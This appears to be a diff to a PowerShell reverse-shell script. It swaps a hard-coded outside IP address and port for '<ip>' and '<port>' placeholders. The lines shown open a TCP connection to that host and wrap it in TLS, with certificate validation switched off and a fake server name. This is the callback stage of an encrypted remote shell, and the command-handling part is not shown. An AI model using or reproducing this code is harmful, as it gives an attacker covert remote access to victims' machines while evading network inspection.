@@ -1,4 +1,4 @@
-$socket = New-Object Net.Sockets.TcpClient('206.189.70.79', 9876)
+$socket = New-Object Net.Sockets.TcpClient('<ip>', <port>)
 $stream = $socket.GetStream()
 $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
 $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
